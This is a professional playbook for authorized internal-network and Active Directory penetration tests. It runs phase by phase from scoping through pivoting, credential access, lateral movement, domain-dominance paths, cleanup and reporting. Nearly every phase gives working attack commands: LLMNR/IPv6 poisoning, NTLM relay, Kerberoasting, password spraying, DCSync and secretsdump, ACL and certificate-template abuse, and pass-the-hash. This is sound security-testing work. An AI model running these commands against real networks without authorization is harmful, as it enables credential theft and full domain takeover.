# Internal Network Penetration Testing / Assumed-Breach Methodology

**Document type:** Repeatable assessment playbook
**Scope of applicability:** Internal network and Active Directory environments you are authorized to test from an internal vantage point — physical/VPN network access, a provided low-privilege domain credential, or a provided foothold host ("assumed breach")
**Standards referenced:** PTES, MITRE ATT&CK (Enterprise), CWE, CVSS v3.1/v4.0, NIST SP 800-115
**Toolchain assumed:** This Kali build — `netexec`/`crackmapexec`, BloodHound CE + `bloodhound-python`/SharpHound, the impacket suite, `responder`, `mitm6`, `certipy-ad`, `bloodyAD`, `ldapdomaindump`, `evil-winrm`, `rubeus`/`mimikatz` (windows-resources), `peass-ng` (winPEAS/linPEAS), `ligolo-ng`/`ligolo-mp`, `chisel`/`sshuttle`/`proxychains-ng`, `hashcat`/`john`, `coercer`/`krbrelayx`, `dploot`, `certi`.

> **Operating constraints baked into this methodology**
> - **Assumed-breach starts post-access.** Initial-access tradecraft is out of scope unless the RoE includes an unauthenticated-internal phase (Phase 3). You begin from the provided credential/host and demonstrate what an attacker with that foothold can reach.
> - **Account lockout is a hard risk.** Model the lockout policy *before* any spraying. Spray ≤ (threshold − 1) per observation window; track per-account attempts.
> - **Some techniques are disruptive.** Responder/LLMNR poisoning and `mitm6` affect other hosts on the segment — scope tightly, time-box, and coordinate. Avoid actions that can destabilize a domain controller.
> - **Persistence and "loud nuclear" options are gated.** Golden/silver tickets, Skeleton Key, DCSync-for-persistence, and AdminSDHolder edits are only run when RoE explicitly allows; prefer demonstrating the *path* over executing domain-wide takeover.
> - **Every object you create or change is logged and reverted.** Added computer accounts (RBCD), group memberships, ACL edits, issued certificates, dropped agents, captured credentials — all tracked in a change log and cleaned up (Phase 10).
> - **Separate evidence from hypothesis;** map findings to MITRE ATT&CK technique IDs; don't be the breach (capture proof, not bulk sensitive data).

## 0. Phase 0 — Pre-Engagement & Assumed-Breach Scoping

**Goal:** Fix authorization, starting posture, safety rails, and deconfliction before touching the environment.

### 0.1 Authorization & starting posture (hard blocker)
Stored in `00-scope/`:
1. Signed authorization naming testing entity, authorizing party, and in-scope domains/subnets/hosts.
2. **Starting posture** (pick the engagement model):
   - *Unauthenticated internal* — network access, no credentials (run Phase 3).
   - *Assumed breach — credentialed* — provided low-priv domain user (skip to Phase 4).
   - *Assumed breach — host* — provided foothold host/agent (start Phase 1).
3. Exclusions: fragile hosts (ICS/OT, medical, legacy), accounts that must not be touched, subnets off-limits.
4. RoE intensity: is exploitation/lateral movement/domain dominance permitted, or stop at path demonstration? Is persistence allowed? Is data exfiltration simulated or real-to-a-marker?
5. **Lockout policy** (request it; also confirm independently in Phase 4) and spray budget.
6. **EDR/AV deconfliction:** is the testing host allow-listed? Are detections expected to fire (purple) or be evaded (red)? Blue-team contacts for deconfliction.
7. Emergency stop procedure + DC-impact escalation contact.

### 0.2 Decision point
- RoE prohibits lateral movement → cap at authenticated enumeration + attack-path mapping (Phase 4/8 analysis only, no execution).
- Posture is unauthenticated and segment hosts sensitive prod → restrict Responder/`mitm6` to a coordinated window or analysis-only.

**Validation gate:** authorization stored, starting posture chosen, lockout budget set, EDR posture agreed, stop procedure known.

## 2. Phase 1 — Foothold & Situational Awareness

**Goal:** Understand the host you have and your network position. MITRE ATT&CK: Discovery (TA0007). *(Skip host-local steps if starting credentialed-only.)*

### 2.1 Windows host triage
```powershell
whoami /all                      # SID, groups, privileges (look for SeImpersonate/SeDebug/etc.)
systeminfo                       # OS/patch level, domain membership
ipconfig /all ; route print ; arp -a
net user /domain ; net group "Domain Admins" /domain
nltest /dclist:<domain> ; nltest /domain_trusts
# Automated:
.\winPEASx64.exe quiet > 06-privesc/windows/winpeas.txt
```

### 2.2 Linux host triage
```bash
id ; sudo -l ; uname -a ; hostname -f
ip a ; ip route ; cat /etc/resolv.conf
find / -perm -4000 -type f 2>/dev/null          # SUID
./linpeas.sh -a > 06-privesc/linux/linpeas.txt
# Domain-joined Linux: realm list ; klist ; ls -la /etc/krb5.keytab
```

### 2.3 Capture
Current user + privileges, integrity level, domain membership, DC list, trusts, network interfaces/routes (these drive pivoting), and any EDR/AV product present (note for deconfliction).

**Validation gate:** identity, privileges, domain context, and reachable networks recorded in `01-foothold/`.

## 3. Phase 2 — Network & Host Discovery (and Pivoting)

**Goal:** Enumerate reachable hosts/services from your vantage point; establish pivots to reach segmented networks. MITRE ATT&CK: T1046, T1090.

### 3.1 Live host & service sweep
```bash
# From Kali on-segment (or through a SOCKS pivot via proxychains)
nxc smb <CIDR>                                   # SMB sweep: hostnames, OS, signing, domain
nmap -Pn -sS -p- --min-rate 1500 -iL targets.txt -oA 02-discovery/nmap_full
nmap -Pn -sV -sC -p <open-ports> -iL live.txt -oA 02-discovery/nmap_services
```
Key internal services: 445/139 (SMB), 88/389/636/3268 (AD/LDAP/GC), 5985/5986 (WinRM), 3389 (RDP), 1433/3306/5432 (DBs), 135 (RPC/DCOM), 5985, 623 (IPMI), 161 (SNMP).

### 3.2 Pivoting to segmented networks (Ligolo-ng / Ligolo-MP)
When the interesting subnets are unreachable from Kali, route through a compromised host.
```bash
# Operator (Kali): start proxy with self-signed cert, listens 0.0.0.0:11601
ligolo-proxy -selfcert
# On the pivot host, run the matching agent back to the operator:
#   agent.exe -connect <operator-ip>:11601 -ignore-cert      (Windows)
#   ./agent -connect <operator-ip>:11601 -ignore-cert        (Linux)
# In ligolo: select session -> "start" ; then add the route on the operator:
#   ip route add 192.168.234.0/24 dev ligolo      (ng)   /  Ligolo-MP manages TUN/route automatically
```
- **Double pivot:** set up a redirector on the first pivot, run a second agent on the next-hop host, add the deeper route.
- **Loopback:** access services bound to 127.0.0.1 on the pivot via Ligolo's loopback feature.
- Alternatives: `chisel` (reverse SOCKS), `sshuttle` (Linux SSH), `proxychains4` to run Kali tools through the SOCKS proxy.

### 3.3 Decision point
- New subnet reachable through pivot → re-run 3.1 against it (record as a distinct enclave).
- Service identified → route to the matching enumeration in Phase 4 (AD) or service module.

**Validation gate:** reachable host:service inventory per enclave; pivot routes documented in `02-discovery/`; agents added to the change log.

## 4. Phase 3 — Unauthenticated Internal AD Attacks *(unauth posture only)*

**Goal:** Obtain a first credential or hash from network position alone. MITRE ATT&CK: T1557 (Adversary-in-the-Middle), T1110 (Brute Force). **Disruptive — scope and time-box.**

### 4.1 Name-resolution poisoning (LLMNR/NBT-NS/mDNS)
```bash
responder -I eth0 -wv        # capture NetNTLMv1/v2 from broadcast name resolution
# Captured hashes land in /usr/share/responder/logs/ -> copy to 05-credaccess/hashes/
```
Crack offline (Phase 5.5) **or** relay (4.3). Don't relay and capture for the same victim simultaneously — disable Responder's SMB/HTTP servers when relaying.

### 4.2 IPv6 DNS takeover (mitm6)
```bash
mitm6 -d <domain>            # spoof DHCPv6/DNS, coerce auth to attacker
# Pair with ntlmrelayx (4.3) to relay to LDAP/LDAPS for delegation/account creation.
```

### 4.3 NTLM relay (no cracking needed)
```bash
# Identify relay-eligible targets: SMB signing NOT required
nxc smb <CIDR> --gen-relay-list 03-unauth/relay_targets.txt
# Relay to SMB (exec) or LDAP/LDAPS (ACL abuse, RBCD, dump)
impacket-ntlmrelayx -tf 03-unauth/relay_targets.txt -smb2support
impacket-ntlmrelayx -t ldaps://<DC> --delegate-access --no-dump   # RBCD via relayed machine acct
```
Coerce authentication to drive a victim to you:
```bash
coercer coerce -u <user> -p <pass> -t <victim> -l <attacker>   # PetitPotam/PrinterBug family
# or krbrelayx printerbug: printerbug.py <domain>/<user>:<pass>@<victim> <attacker>
```

### 4.4 Pre-auth credential attacks
```bash
# AS-REP roast accounts with pre-auth disabled (no creds needed if you have a user list)
impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <DC> -outputfile 05-credaccess/hashes/asrep.txt
# Password spray a single safe guess across many users (lockout-aware!)
nxc smb <DC> -u users.txt -p 'Winter2025!' --continue-on-success
```

**Validation gate:** at least one credential/hash obtained, or unauth avenues documented as exhausted; disruptive tools stopped after the coordinated window. Proceed to Phase 4 once you hold a credential.

## 5. Phase 4 — Authenticated AD Enumeration

**Goal:** With any domain credential, map the directory and identify attack paths. MITRE ATT&CK: T1087 (Account Discovery), T1482 (Domain Trust Discovery), T1069 (Permission Groups Discovery).

### 5.1 BloodHound collection
```bash
# Remote collector (Linux), CE-compatible
bloodhound-python -u <user> -p '<pass>' -d <domain> -dc <DC-FQDN> -ns <DC-IP> -c All --zip
# Or via netexec (all-in-one, outputs a ZIP under ~/.nxc/logs/)
nxc ldap <DC> -u <user> -p '<pass>' --bloodhound --collection All --dns-server <DC-IP>
# Or SharpHound on a Windows foothold:  SharpHound.exe -c All --zipfilename loot.zip
# Upload the ZIP to BloodHound CE.
```
Run the high-value saved queries: All Domain Admins, Principals with DCSync rights, AS-REP roastable users, Kerberoastable users, Shortest paths to Tier-0 / high-value targets, ACL abuse edges (GenericAll/WriteOwner/ForceChangePassword/AddMember), unconstrained/constrained/RBCD delegation, ADCS, OU/GPO structure, AdminSDHolder-protected objects.

### 5.2 LDAP / domain object dump
```bash
ldapdomaindump -u '<domain>\<user>' -p '<pass>' <DC> -o 04-ad-enum/ldap/
nxc ldap <DC> -u <user> -p '<pass>' --users --groups --computers --trusted-for-delegation --password-not-required
bloodyAD -u <user> -p '<pass>' -d <domain> --host <DC> get writable   # objects you can modify
```

### 5.3 SMB share enumeration (data + cred hunting)
```bash
nxc smb <CIDR> -u <user> -p '<pass>' --shares
nxc smb <CIDR> -u <user> -p '<pass>' -M spider_plus           # index share contents
# Hunt GPP cpassword, scripts, configs, keys:
nxc smb <CIDR> -u <user> -p '<pass>' -M gpp_password
manspider <CIDR> -u <user> -p '<pass>' -f 'pass' 'cred' 'secret'   # if installed
```

### 5.4 ADCS surface (Certipy)
```bash
certipy-ad find -u <user>@<domain> -p '<pass>' -dc-ip <DC-IP> -stdout -vulnerable
# Flags ESC1–ESC16 misconfigurations for Phase 8.
```

### 5.5 Capture
Domain/forest trusts, Tier-0 assets, kerberoastable/AS-REP-roastable accounts, ACL/delegation/ADCS paths, readable LAPS/gMSA, accessible shares with secrets. Mark each path **Confirmed** (verified property) vs. **Candidate** (BloodHound edge to validate).

**Validation gate:** BloodHound DB populated; high-value queries run; shortlist of attack paths written to `08-adpaths/paths.md` with confirmed/candidate status.

## 6. Phase 5 — Credential Access

**Goal:** Acquire and crack credentials/tickets to enable escalation and lateral movement. MITRE ATT&CK: T1003 (OS Credential Dumping), T1558 (Kerberos), T1552 (Unsecured Credentials).

### 6.1 Kerberoasting & AS-REP roasting (need any domain user)
```bash
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <DC-IP> -request -outputfile 05-credaccess/hashes/kerberoast.txt
impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <DC-IP> -outputfile 05-credaccess/hashes/asrep.txt
```

### 6.2 Local secrets on a host you control (admin/SYSTEM)
```bash
# Remote, with local-admin creds/hash:
nxc smb <host> -u <admin> -p '<pass>' --sam --lsa
impacket-secretsdump <domain>/<admin>:'<pass>'@<host>          # SAM, LSA secrets, cached creds
# On-host (SYSTEM): mimikatz  sekurlsa::logonpasswords  /  lsadump::sam
```

### 6.3 DPAPI, gMSA, LAPS
```bash
dploot triage -u <user> -p '<pass>' -d <domain> <host>        # DPAPI masterkeys/creds/vaults
nxc ldap <DC> -u <user> -p '<pass>' --gmsa                     # readable gMSA passwords
impacket-GetLAPSPassword <domain>/<user>:'<pass>' -dc-ip <DC-IP>   # if you have read rights
```

### 6.4 NTDS.dit / DCSync (domain-replication rights — gated)
```bash
# DCSync a specific account (requires DS-Replication rights; loud — RoE-gated)
impacket-secretsdump <domain>/<user>:'<pass>'@<DC> -just-dc-user krbtgt
```
> Prefer pulling a single high-value hash to prove the primitive over dumping the whole domain. Full NTDS extraction and krbtgt handling are RoE-gated (golden-ticket capability).

### 6.5 Cracking
```bash
hashcat -m 13100 05-credaccess/hashes/kerberoast.txt wordlist.txt -r best64.rule   # TGS-REP
hashcat -m 18200 05-credaccess/hashes/asrep.txt wordlist.txt                       # AS-REP
hashcat -m 1000  05-credaccess/hashes/ntlm.txt wordlist.txt                        # NTLM
# john equivalents available; store cracked creds in 05-credaccess/cracked/ (handle per RoE)
```

**Validation gate:** each obtained secret recorded with source, type, and account; cracked vs. uncracked tracked; everything in `05-credaccess/` handled per data rules.

## 7. Phase 6 — Privilege Escalation (Local)

**Goal:** Elevate on a host to enable credential access or lateral movement. MITRE ATT&CK: TA0004.

### 7.1 Windows
| Vector | Check | Abuse |
|--------|-------|-------|
| Token privileges | `whoami /priv` → `SeImpersonate`/`SeAssignPrimaryToken` | Potato family (Print/Rogue/God Potato) → SYSTEM |
| | `SeDebug`/`SeBackup`/`SeRestore` | LSASS dump / SAM+SYSTEM hive copy |
| Service binaries | unquoted path, weak ACLs (winPEAS) | replace/hijack service exe |
| Service DLLs | writable DLL search path | DLL hijack |
| UAC (admin, medium IL) | `whoami /groups` shows Administrators but medium IL | UAC bypass (e.g., fodhelper) → high IL |
| AlwaysInstallElevated | registry both keys = 1 | malicious MSI |
| Stored creds | cmdkey, registry, unattend.xml, GPP | reuse |

```powershell
.\winPEASx64.exe quiet servicesinfo applicationsinfo > 06-privesc/windows/winpeas.txt
# Confirm elevation, then capture proof (whoami /priv as high-IL or SYSTEM).
```

### 7.2 Linux
```bash
sudo -l                                   # misconfigured sudo (GTFOBins)
find / -perm -4000 -type f 2>/dev/null    # SUID
cat /etc/crontab ; ls -la /etc/cron.*     # writable cron jobs
# kernel exploits last resort (note stability risk); confirm version vs known CVE
```
```bash
./linpeas.sh > 06-privesc/linux/linpeas.txt
```

### 7.3 Decision point
- Local admin/SYSTEM achieved → return to Phase 5 (dump local secrets) and Phase 7 (move laterally with new creds).
- Privesc requires a kernel exploit on a production host → confirm with RoE (stability risk) before running.

**Validation gate:** elevation proven with captured `whoami /priv` (high-IL/SYSTEM) or `id` (root); method + evidence in `06-privesc/`.

## 8. Phase 7 — Lateral Movement

**Goal:** Reuse credentials/hashes/tickets to access additional hosts. MITRE ATT&CK: T1021, T1550 (Use Alternate Auth Material), T1570.

### 8.1 Validate reach first (spray creds across hosts — lockout-aware)
```bash
nxc smb <CIDR> -u <user> -H <NTLM-hash>             # where can this account go? (--local-auth for local accts)
```
```bash
nxc smb <CIDR> -u <user> -H <NTLM-hash> | grep Pwn3d   # admin on which hosts
```

### 8.2 Execute
| Technique | Tool | Notes |
|-----------|------|-------|
| Pass-the-Hash | `nxc`/`impacket-psexec -hashes`, `evil-winrm -H` | NTLM hash, no plaintext |
| Overpass-the-Hash / PtT | `impacket-getTGT`, `export KRB5CCNAME`, `-k` | Kerberos from hash/ticket |
| WMI | `impacket-wmiexec` | fileless, common |
| WinRM | `evil-winrm -i <host> -u -p` (or `-H`) | 5985/5986 |
| PsExec | `impacket-psexec` | service-based, noisier |
| SMBexec | `impacket-smbexec` | semi-interactive |
| DCOM | `impacket-dcomexec` | MMC20/ShellWindows |
| RDP | `xfreerdp /u /p` | interactive; clear-text cred theft risk on target |
| SSH (Linux) | keys, agent-forward hijack (ControlMaster) | DevOps lateral paths |

```bash
# Example: PtT
impacket-getTGT <domain>/<user> -hashes :<NTLM>
export KRB5CCNAME=<user>.ccache
impacket-wmiexec -k -no-pass <domain>/<user>@<host-fqdn>
```

**Validation gate:** each lateral hop has captured proof (command output identifying the new host) and is logged; tickets/agents added to the change log.

## 9. Phase 8 — AD Attack-Path Execution (Toward Domain Dominance)

**Goal:** Execute the validated paths from Phase 4 to reach Tier-0. MITRE ATT&CK: T1484 (Domain Policy Modification), T1222 (ACL), T1649 (Steal/Forge Certificates), T1558.

> Each abuse below **creates state** (group members, ACLs, accounts, certs). Log every change and revert in Phase 10.

### 9.1 ACL abuse (BloodHound "Linux/Windows Abuse" edges)
```bash
# ForceChangePassword over a target user
bloodyAD -u <user> -p '<pass>' -d <domain> --host <DC> set password <target> 'NewP@ss123!'
# GenericAll / WriteOwner / GenericWrite chains
impacket-owneredit -action write -new-owner <you> -target <target> '<domain>/<user>:<pass>'
impacket-dacledit -action write -rights FullControl -principal <you> -target <target> '<domain>/<user>:<pass>'
# AddMember to a privileged group
net rpc group addmem "<TargetGroup>" "<you>" -U "<domain>/<user>%<pass>" -S <DC>
```

### 9.2 Delegation
- **Unconstrained:** compromise a host trusted for unconstrained delegation → coerce a DC (printerbug) → capture DC TGT.
- **Constrained:** `impacket-getST -spn <service> -impersonate Administrator <domain>/<acct> -hashes :<NTLM>`.
- **RBCD:** if you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target (often via relay/ACL): add a controlled computer (`impacket-addcomputer`), set RBCD (`impacket-rbcd`), then `getST -impersonate`.

### 9.3 ADCS (Certipy)
```bash
# ESC1 example: request a cert as a privileged user via a vulnerable template
certipy-ad req -u <user>@<domain> -p '<pass>' -ca <CA> -template <vuln-template> -upn administrator@<domain>
certipy-ad auth -pfx administrator.pfx -dc-ip <DC-IP>   # -> TGT / NT hash
```

### 9.4 DCSync (domain dominance proof — gated)
```bash
impacket-secretsdump <domain>/<user>:'<pass>'@<DC> -just-dc-user <target>
```
Demonstrate the capability against one high-value account; **do not** establish golden-ticket persistence unless RoE explicitly authorizes it.

**Validation gate:** the path from foothold → Tier-0 is demonstrated and captured as an attack-path narrative; every created object recorded in the change log.

## 10. Phase 9 — Objective / Data Access

**Goal:** Demonstrate business impact per the engagement objective (e.g., access to a crown-jewel system or dataset) without becoming the breach.

- Prove access with the **minimum** evidence: a directory listing, schema + row counts, a single benign marker file — not bulk PII/sensitive content.
- Capture screenshots with host/timestamp into `07-evidence/`.
- If the objective is a specific application/database, demonstrate authenticated reach and stop at proof.

**Validation gate:** objective met with bounded proof; sensitive data not exfiltrated beyond what proves impact (per RoE).

---

## 11. Phase 10 — Cleanup & Deconfliction (Mandatory)

**Goal:** Return the environment to its prior state and give defenders a complete change record.

From `10-cleanup/change-log/changes.md`, reverse every modification:
1. Remove added computer accounts (RBCD), group memberships, and ACL edits.
2. Revoke/clean issued certificates and remove any dropped agents/binaries/scheduled tasks/services.
3. Purge captured ticket caches and stored credentials per data-handling rules; document handling of any cracked passwords.
4. Stop and remove pivots (Ligolo agents, chisel) and routes.
5. Provide the blue team a timeline of source IPs, techniques, and timestamps for deconfliction.

> Example cleanup discipline: after pivoting/credential operations, explicitly remove uploaded tooling (e.g., agent binaries, SharpHound/PowerView artifacts) to restore the target and reduce forensic footprint.

**Validation gate:** every change-log entry has a corresponding revert with evidence; no test artifacts left behind.

## 12. Phase 11 — Reporting

**Goal:** Deliver evidence-based findings plus the end-to-end attack-path narrative, readable by a PM and defensible to engineers.

### 12.1 Report structure
1. Executive summary (could an attacker with the assumed-breach foothold reach domain dominance / the objective? Key path, root causes).
2. Scope, posture, RoE, windows, deconfliction notes.
3. **Attack-path narrative** (foothold → … → Tier-0/objective) with a BloodHound-style graph and MITRE ATT&CK technique IDs per step.
4. Findings (ranked), using the template below.
5. Methodology/coverage (what was and wasn't tested).
6. Evidence appendix (cross-referenced to `07-evidence/`).
7. Remediation roadmap (prioritized; Tier-0 hardening, signing, lockout, LAPS, ADCS template fixes, tiering).

### 12.2 Finding template
```markdown
### [Finding ID] <Title>

**Summary:** <Plain-language: what's weak and why it matters.>

**Affected component:** <host/account/template/GPO, domain>
**Attack surface / entry point:** <where it's reached from in the path>
**Weakness classification:** <e.g., excessive ACL, missing SMB signing, kerberoastable svc acct, ESC1>
**CWE mapping:** CWE-### <name>   (mark "uncertain" if not confidently mappable)
**MITRE ATT&CK:** <Txxxx.xxx technique(s)>
**CVSS:** <vector> → <score/severity>   (omit/mark "not scored" if unsupportable)

**Preconditions:** <Foothold/cred/position required to reach this step.>

**Evidence:**
<Observed facts only — command output, screenshots, BloodHound edges.
Reference 07-evidence/ artifacts by filename + hash.>

**Root cause:** <Underlying misconfig/design: weak ACL, default template, no signing, reused local admin, etc.>

**Impact:** <Concrete, evidence-bounded: what this step grants. Separate CONFIRMED from INFERRED.>

**Exploitability:** <Reliability, preconditions, skill/access required. CONFIRMED vs INFERRED.>

**Reproduction steps:**
1. <Exact commands, in order.>

**Expected vs. observed:**
- Expected (secure): <hardened behavior>
- Observed: <what the environment allowed>

**Fix recommendation:** <Specific control: tiering, signing enforcement, template hardening, LAPS, lockout, least privilege.>

**Validation after fix:** <The same check that succeeds pre-fix and fails post-fix.>

**Residual risk:** <What remains; compensating controls.>
```

### 12.3 Quality checks
Each finding: evidence present; CWE/CVSS/ATT&CK supportable or marked uncertain; reproduction validated; no invented edges, accounts, or rights; executive summary readable standalone; **change log fully reverted**.

**Validation gate:** attack-path narrative complete with ATT&CK mapping; every finding links to hashed evidence; cleanup verified.

## 13. Cross-Phase Decision Summary

```
Phase 0  Authorized + posture set? ─ no ─► STOP
Phase 1  Foothold triaged (identity, privs, network) ─► Phase 2
Phase 2  Reachable hosts/services mapped; pivots up ─► Phase 3 (unauth) or Phase 4 (cred)
Phase 3  (unauth) Got a credential/hash? ── yes ─► Phase 4
         └─ no ─► document exhausted avenues, request posture change
Phase 4  AD mapped; attack paths shortlisted (BloodHound) ─► Phase 5
```

## 16. Appendix C — Safety Cautions (internal/AD specific)
- **Lockout:** model policy first; spray within budget; track per-account counts.
- **Disruptive MitM:** Responder/`mitm6` affect the whole segment — coordinate, time-box, scope.
- **DC stability:** avoid actions that risk DC availability; handle NTDS.dit/krbtgt with care.
- **Persistence gating:** golden/silver tickets, Skeleton Key, AdminSDHolder, DCSync-persistence only with explicit RoE.
- **Created objects:** every added account/member/ACL/cert/agent goes in the change log and is reverted in Phase 10.
- **EDR deconfliction:** confirm allow-listing and whether detections are expected (purple) or to be evaded (red).
